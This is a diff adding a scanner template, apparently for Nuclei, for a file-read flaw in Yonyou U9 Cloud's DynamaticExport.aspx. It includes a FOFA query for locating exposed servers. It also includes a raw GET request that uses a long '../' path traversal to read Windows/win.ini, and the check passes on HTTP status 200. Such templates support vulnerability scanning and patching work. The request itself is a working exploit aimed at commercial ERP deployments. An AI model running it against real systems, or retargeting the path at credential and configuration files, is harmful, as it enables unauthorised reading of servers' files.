@@ -1,0 +1,19 @@
+id: poc-eygm4z0vynb5fie2
+info:
+  name: 用友U9 Cloud DynamaticExport.aspx存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eygm4z0vynb5fie2'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eygm4z0vynb5fie2
+    fofa: body="logo-u9.png" || body="/U9/css/"
+http:
+- raw:
+  - GET /print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
